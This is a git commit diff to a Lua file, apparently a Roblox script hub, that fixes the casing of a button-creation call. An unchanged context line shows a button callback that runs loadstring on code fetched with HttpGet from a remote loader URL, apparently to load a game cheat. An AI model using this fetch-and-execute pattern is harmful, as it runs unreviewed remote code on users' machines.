19e857a19dc8c5033c479acf7f810ccdcc8fc559
bronxkid <doyouthinkiknowthisisfortwitch@gmail.com>
2025-08-01 23:22:26 -0400

    Update TRUST.lua

--- TRUST.lua
+++ TRUST.lua
@@ -43,7 +43,7 @@ local Button = Tab:CreateButton({
 	end
 })
 local Tab = Window:CreateTab("Hoopz", 4483362458) -- Title, Image
-local Button = Tab:createButton({
+local Button = Tab:CreateButton({
 	Name = "Hoopz",
 	Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/bf15a15feb3e074f81db01496cbb48e2.lua"))()
